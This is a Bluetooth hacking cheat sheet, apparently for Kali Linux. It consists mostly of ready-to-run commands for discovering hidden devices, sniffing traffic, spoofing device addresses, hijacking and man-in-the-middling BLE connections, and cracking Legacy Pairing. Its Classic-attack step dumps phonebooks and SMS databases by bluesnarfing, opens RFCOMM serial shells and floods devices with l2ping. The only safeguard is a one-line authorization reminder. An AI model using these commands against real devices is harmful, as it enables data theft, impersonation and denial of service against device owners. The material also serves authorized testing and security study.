Bluetooth Hacking - Cheat Sheet

Attack Bluetooth Classic and BLE devices — recon, sniffing, spoofing,
MITM, and exploitation. Hardware: an Ubertooth One is needed for raw
sniffing; a standard BT adapter handles most recon and BLE attacks.
Replace <placeholders> with your own values.

>>> Only test devices you own or are authorized to test. <<<


Step 1 - Setup & install non-default tools

Kali ships with bluez, hcitool, and bluetoothctl. Install the rest:

    # already on Kali
    hciconfig           # verify your BT adapter is up
    bluetoothctl        # interactive BT shell
    sdptool             # SDP service queries

    # install what's missing
    sudo apt update && sudo apt install -y \
      ubertooth          `# Ubertooth One tools (ubertooth-btle, ubertooth-rx)` \
      btlejack            `# BLE sniffing + MITM (needs micro:bit or Ubertooth)` \
      redfang             `# find non-discoverable BT Classic devices` \
      spooftooph          `# BD_ADDR spoofing` \
      crackle             `# crack BLE Legacy Pairing from sniffed traffic`

    # bettercap (BLE module)
    sudo apt install -y bettercap

    # GATTacker (BLE MITM — Node.js based)
    git clone https://github.com/AresS31/GATTacker.git
    cd GATTacker && npm install

    # bdaddr (change local BD_ADDR — part of bluez extras)
    sudo apt install -y bluez-test-tools 2>/dev/null || true


Step 2 - Bring your adapter up

    sudo hciconfig hci0 up          # power on the adapter
    hciconfig -a                    # confirm BD_ADDR, type, features
    sudo hciconfig hci0 piscan      # make your adapter discoverable + connectable
    sudo hciconfig hci0 noscan      # hide it again (stealth)


Step 3 - Recon & discovery (Classic)

    # scan for discoverable devices (inquiry scan — 10 sec)
    hcitool scan

    # find NON-discoverable devices (brute-force BD_ADDR ranges)
    sudo redfang -r 00:11:22:33:44:00-00:11:22:33:44:FF -n

    # detailed info about a specific device
    hcitool info <BD_ADDR>

    # device name lookup
    hcitool name <BD_ADDR>

    # enumerate services (SDP)
    sdptool browse <BD_ADDR>
    sdptool search --bdaddr <BD_ADDR> SP     # search for Serial Port profile
    sdptool search --bdaddr <BD_ADDR> DID    # Device ID profile


Step 4 - Recon & discovery (BLE)

    # passive BLE scan (shows advertising devices + their UUIDs)
    sudo hcitool lescan

    # bettercap BLE recon (better output + interactive)
    sudo bettercap
    > ble.recon on
    > ble.show                   # list discovered BLE devices
    > ble.enum <BD_ADDR>         # enumerate GATT services + characteristics

    # bluetoothctl (interactive BLE inspection)
    bluetoothctl
    > scan on                    # start BLE + Classic scan
    > devices                    # list found devices
    > connect <BD_ADDR>          # connect to a device
    > menu gatt                  # enter GATT menu
    > list-attributes            # show services + characteristics
    > select-attribute <UUID>    # pick a characteristic
    > read                       # read its value
    > write <hex-bytes>          # write to it


Step 5 - BLE GATT enumeration (gatttool)

    # install if missing (older Kali — newer uses bluetoothctl)
    sudo apt install -y bluez

    # interactive mode
    gatttool -b <BD_ADDR> -I
    > connect
    > primary                    # list primary services
    > characteristics            # list characteristics
    > char-read-hnd <handle>     # read by handle (hex, e.g. 0x000e)
    > char-write-req <handle> <value>   # write to a handle (e.g. 0100)

    # one-shot read
    gatttool -b <BD_ADDR> --char-read -a <handle>


Step 6 - Sniffing BT traffic (Ubertooth One)

    # sniff BLE advertising channels
    ubertooth-btle -f -c /tmp/ble_sniff.pcap
    # -f = follow connections   -c = write pcap for Wireshark

    # sniff BT Classic (frequency hopping — harder)
    ubertooth-rx -l -c /tmp/classic_sniff.pcap

    # live capture into Wireshark
    sudo ubertooth-btle -f | wireshark -k -i -

    # btlejack — sniff existing BLE connections (needs micro:bit or Ubertooth)
    sudo btlejack -d /dev/ttyACM0
    > scan
    > follow <access_address>    # follow a specific connection
    > sniff                      # dump packets


Step 7 - BD_ADDR spoofing & MAC manipulation

    # spoof your adapter's BD_ADDR to impersonate a device
    sudo spooftooph -i hci0 -a <target-BD_ADDR>

    # or with bdaddr (bluez-test-tools)
    sudo bdaddr -i hci0 <new-BD_ADDR>
    sudo hciconfig hci0 reset     # apply the change

    # clone a device name + class as well
    sudo hciconfig hci0 name "TargetDeviceName"
    sudo hciconfig hci0 class 0x200404    # device class (e.g. audio headset)


Step 8 - BLE MITM (btlejack / GATTacker / bettercap)

    # btlejack — jam + hijack an active BLE connection
    sudo btlejack -d /dev/ttyACM0
    > scan
    > follow <access_address>
    > hijack                     # take over the connection

    # GATTacker — BLE MITM proxy (clone a device, sit in the middle)
    # terminal 1: scan and clone the target
    sudo node scan.js
    sudo node advertise.js -a <target-BD_ADDR>

    # terminal 2: proxy connections and intercept/modify data
    sudo node proxy.js -t <target-BD_ADDR>

    # bettercap BLE proxy
    sudo bettercap
    > ble.recon on
    > ble.enum <BD_ADDR>
    > set ble.proxy.target <BD_ADDR>
    > ble.proxy on               # MITM proxy between you and the device


Step 9 - Crack BLE Legacy Pairing (crackle)

    # capture the pairing exchange with Ubertooth first (Step 6)
    # then feed the pcap to crackle

    crackle -i /tmp/ble_sniff.pcap -o /tmp/decrypted.pcap
    # crackle brute-forces the TK (Temporary Key) for Legacy Pairing
    # outputs decrypted traffic — open in Wireshark

    # only works on BLE Legacy Pairing (Just Works / 6-digit passkey)
    # does NOT work on LE Secure Connections (ECDH)


Step 10 - Classic attacks

    # Bluesnarfing — unauthorized OBEX access (pull contacts, SMS, calendar)
    # (bluesnarfer is not in Kali by default)
    sudo apt install -y bluesnarfer 2>/dev/null || \
      git clone https://github.com/balle/bluesnarfer.git && cd bluesnarfer && make
    bluesnarfer -b <BD_ADDR> -r 1-100      # read phonebook entries
    bluesnarfer -b <BD_ADDR> -s DB          # dump full device database

    # RFCOMM shell — connect to an open Serial Port channel
    sdptool browse <BD_ADDR> | grep -A5 "Serial Port"   # find the channel
    sudo rfcomm connect hci0 <BD_ADDR> <channel>
    screen /dev/rfcomm0                     # interactive serial session

    # BlueSmack — L2CAP ping flood (DoS)
    sudo l2ping -i hci0 -s 600 -f <BD_ADDR>
    # -s 600 = 600 byte packets   -f = flood mode


Step 11 - Wireshark BT analysis

    # open a capture from Ubertooth / btlejack
    wireshark /tmp/ble_sniff.pcap

    # useful display filters:
    #   btle                          all BLE packets
    #   btle.advertising_address      filter by device
    #   btatt                         ATT protocol (GATT reads/writes)
    #   btsmp                         Security Manager (pairing)
    #   btl2cap                       L2CAP layer
    #   bthci_evt                     HCI events


Cleanup

    sudo hciconfig hci0 down        # power off adapter
    sudo hciconfig hci0 up          # or bring it back to normal
    sudo systemctl restart bluetooth


Hardware reference
    Ubertooth One       raw 2.4 GHz sniffer — needed for Classic sniffing + BLE follows
    micro:bit (nRF51)   cheap BLE sniffer for btlejack ($15)
    CSR 4.0 USB dongle  standard BT adapter — handles recon + BLE GATT + some attacks
    Sena UD100          long-range Class 1 BT adapter (~100m)
    HackRF One          wideband SDR — can do BT with custom firmware (advanced)

Key idea: Bluetooth Classic relies on discoverable/connectable modes and SDP
services — scan, enumerate, and abuse open profiles (OBEX, Serial Port). BLE
is all about GATT characteristics — enumerate them, read/write unprotected
handles, or MITM the connection with btlejack/GATTacker. Legacy Pairing
(both Classic and BLE) is weak — crackle breaks BLE Legacy in seconds from a
sniffed pcap. An Ubertooth One is your ALFA card equivalent for Bluetooth.
